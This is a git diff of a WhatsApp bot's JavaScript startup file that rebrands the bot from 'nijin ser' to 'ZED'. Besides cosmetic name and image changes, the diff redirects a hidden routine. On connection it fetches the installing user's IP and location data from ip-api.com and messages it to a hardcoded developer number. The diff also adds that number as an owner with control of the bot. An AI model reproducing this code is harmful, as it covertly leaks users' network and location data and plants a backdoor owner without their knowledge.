@@ -26,8 +26,8 @@ const settings = JSON.parse(fs.readFileSync('./settings.json'))
 				year: 'numeric'
 		       })
 // nijin
-ownernamenijin = " ꪶ͢ɴɪᴊɪɴ sᴇʀꫂ⁩"
-botnamenijin = "ī.ᴀᴍ/ꪶ͢ɴɪᴊɪɴ sᴇʀꫂ⁩"
+ownernamenijin = "ī.ᴀᴍ/ꪶ͢ʜᴀᴄᴋᴇʀ;ᴢᴇᴅꫂ⁩"
+botnamenijin = "ī.ᴀᴍ/ꪶ͢ʜᴀᴄᴋᴇʀ;ᴢᴇᴅꫂ"
 
 // ------------- fear aavanda keto -----------
 
@@ -40,7 +40,7 @@ async function starts() {
 denz.autoReconnect = ReconnectMode.onConnectionLost
     denz.version = [3,3234,9]
     denz.logger.level = 'warn'
-    denz.browserDescription = ['nijin Sir','Desktop','3.0']
+    denz.browserDescription = ['ZED','Desktop','3.0']
     await sleep(10000)
     denz.on('qr', qr => {
         qrcode.generate(qr, { small: true })
@@ -61,7 +61,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("919605385305@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer nijin ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919605385305?text=Hi da muthe"}}})
+       denz.sendMessage("94771323434@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer ZED",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/94771323434?text=Hi"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
@@ -87,8 +87,8 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["919605385305@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "919605385305@s.whatsapp.net"
+        ownerNumber = ["94771323434@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "94771323434@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
         denz.on('group-participants-update', async (anu) => {
@@ -132,15 +132,15 @@ denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 			try {
 			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
 			} catch {
-			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+			ppimg = 'https://www.linkpicture.com/q/20211229_144640.jpg'
 			}
 			let buff = await getBuffer(ppimg)
-						masuk =`┌─  ❑ *_𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻 𝙱𝙾𝚃_*   ❑
+						masuk =`┌─  ❑ *_𝐙𝐄𝐃 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻 𝙱𝙾𝚃_*   ❑
 ┊➥  *Hᴇʏ ʙʀᴏ* @${num.split('@')[0]}            
 ┊➥  *ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ*  ${mdata.subject} *ɢʀᴏᴜᴘ*  
 └───────────────〄  
 ┌───〔 *_𝙱𝙾𝚃 𝙸𝙽𝙵𝙾_* 〕                           
-┊ ▢ *ᴅᴇᴠᴇʟᴏʟᴇʀ* : ꪶ͢ɴɪᴊɪɴ sᴇʀ                                    
+┊ ▢ *ᴅᴇᴠᴇʟᴏʟᴇʀ* : ⁨ɪͥᴛͭsᷤ ᴍᷟᴇͤ ī.am 𝜡𝛯ᗪ⁴⁰⁴⁩                            
 ┊ ▢ *ᴏᴡɴᴇʀ* : ${ownernamenijin}   
 ┊ ▢ *ʙᴏᴛ ɴᴀᴍᴇ* : ${botnamenijin}                               
 ┊ ▢ *ᴘʀᴇғɪx* : ${multi ? 'Multi Prefix' : 'No Prefix'}
@@ -152,7 +152,7 @@ denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 ┊
 ┊     ▎▍▌▌▉▏▎▌▉▐▏▌▎    
 ┊     ▎▍▌▌▉▏▎▌▉▐▏▌▎  
-┊      ©919605385305
+┊      ©94771323434
 └──────────────────〄
 ┌───〔 *_𝚃𝙸𝙼𝙴 𝙸𝙽𝙵𝙾_* 〕                           
 ┊
@@ -173,7 +173,7 @@ denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 			try {
 			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
 			} catch {
-			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+			ppimg = 'https://www.linkpicture.com/q/20211229_144640.jpg'
 			}
 			let buff = await getBuffer(ppimg)
 			keluar =`𝙶𝚘𝚘𝚍𝚋𝚢𝚎 𝙱𝚛𝚘 @${num.split('@')[0]}\n𝙷𝚘𝚙𝚎𝚏𝚞𝚕𝚕𝚢 𝙰𝚋𝚘𝚞𝚝 𝚝𝚑𝚎𝚛𝚎`
@@ -184,7 +184,7 @@ mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: 
 const buttonMessages = {
 imageMessage: mhan.message.imageMessage,
 contentText: `${keluar}`,
-footerText: `ī.ᴀᴍ/ꪶ͢ɴɪᴊɪɴ sᴇʀꫂ⁩`,
+footerText: `⁨ɪͥᴛͭsᷤ ᴍᷟᴇͤ ī.am 𝜡𝛯ᗪ⁴⁰⁴⁩⁩`,
 buttons: gbutsan,
 headerType: 4
 }
@@ -269,7 +269,7 @@ denz.copyNForward(m.key.remoteJid, m.message)
 denz.sendMessage(m.key.remoteJid, `▷\`\`\`𝙰𝙽𝚃𝙸 𝙳𝙴𝙻𝙴𝚃𝙴\`\`\`
 ➬ \`\`\`𝙽𝙰𝙼𝙴 : @${m.participant.split("@")[0]}\`\`\`
 ➬ \`\`\`𝚃𝚈𝙿𝙴 : ${c3type}\`\`\`
-➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 - 𝙱𝙾𝚃 𝙱𝚈 - ꪶ͢ɴɪᴊɪɴ sᴇʀꫂ⁩⁩\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
+➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 - 𝙱𝙾𝚃 𝙱𝚈 - ⁨ɪͥᴛͭsᷤ ᴍᷟᴇͤ ī.am 𝜡𝛯ᗪ⁴⁰⁴⁩⁩⁩\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
 }
 })
 }
@@ -298,7 +298,7 @@ console.log(color(figlet.textSync(`${settings.NamaBot}`, {
 		vertivalLayout: 'default',
 		width: 80,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping(' Created By nijin ser' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping(' Created By ZED' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
 	title: '\n\nLoading' ,
